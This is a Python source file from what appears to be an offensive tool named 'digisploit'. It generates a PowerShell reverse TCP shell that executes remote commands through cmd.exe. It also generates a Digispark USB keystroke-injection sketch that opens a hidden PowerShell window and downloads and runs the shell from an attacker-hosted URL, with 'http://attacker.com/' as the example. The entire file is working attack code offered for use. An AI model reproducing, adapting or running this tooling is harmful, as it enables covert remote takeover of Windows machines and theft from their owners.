import os, sys,time
from colorama import Fore


def reverse_shell_tcp():
    r_shell_tcp_ps1 = '$socket = new-object System.Net.Sockets.TcpClient({}, {});'

    r_shell_tcp_ps1_2 = '''
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
$pinfo = New-Object System.Diagnostics.ProcessStartInfo
$pinfo.FileName = "cmd.exe"
$pinfo.RedirectStandardError = $true
$pinfo.RedirectStandardOutput = $true
$pinfo.UseShellExecute = $false
$pinfo.Arguments = "/c $out $args"
$p = New-Object System.Diagnostics.Process
$p.StartInfo = $pinfo
$p.Start() | Out-Null
$p.WaitForExit()
$stdout = $p.StandardOutput.ReadToEnd()
$stderr = $p.StandardError.ReadToEnd()
if ($p.ExitCode -ne 0) {
$res = $stderr
} else {
$res = $stdout
}
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
$writer.WriteLine($res)
}
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()'''

    r_shell_ino = '''
#include "DigiKeyboard.h"

char payload[] = "powershell -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString({})";
'''

    r_shell_ino_2 = '''

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(payload);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {


}'''

    print(f'\n{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} 1st Step: Create reverse_shell_tcp.ps1\n')
    ip_ps1 = input(f'{Fore.LIGHTRED_EX}root@digisploit{Fore.LIGHTWHITE_EX}:{Fore.LIGHTBLUE_EX}(win/shell/reverse_tcp){Fore.LIGHTWHITE_EX} LHOST: ')
    port_ps1 = input(f'{Fore.LIGHTRED_EX}root@digisploit{Fore.LIGHTWHITE_EX}:{Fore.LIGHTBLUE_EX}(win/shell/reverse_tcp){Fore.LIGHTWHITE_EX} LPORT: ')

    result = open('constructions/reverse_shell_tcp/reverse_shell_tcp.ps1', 'w')
    result.write(r_shell_tcp_ps1.format("'" + ip_ps1 + "'", port_ps1))
    result.write(r_shell_tcp_ps1_2)
    result.close()

    print(f'\n{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} reverse_shell_tcp.ps1 created in "constructions/reverse_shell_tcp"\n')

    print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} 2st Step: Create Digispark Script\n')
    print(f'''{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Now host the file that is in "constructions/reverse_shell_tcp/reverse_shell_tcp.ps1" \non your web server. Host it in "/var/www/html", the important thing is it's in the central web directory.''')
    payload_link = input(f'{Fore.LIGHTRED_EX}root@digisploit{Fore.LIGHTWHITE_EX}:{Fore.LIGHTBLUE_EX}(win/shell/reverse_tcp){Fore.LIGHTWHITE_EX} Payload Link (ex: http://attacker.com/): ')

    print(f'\n{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Finished! Results in "constructions/reverse_shell_tcp"')
    time.sleep(5)
    result2 = open('constructions/reverse_shell_tcp/reverse_shell_tcp.ino', 'w')
    result2.write(r_shell_ino.format("'" + payload_link + "'"))
    result2.write(r_shell_ino_2)
    result2.close()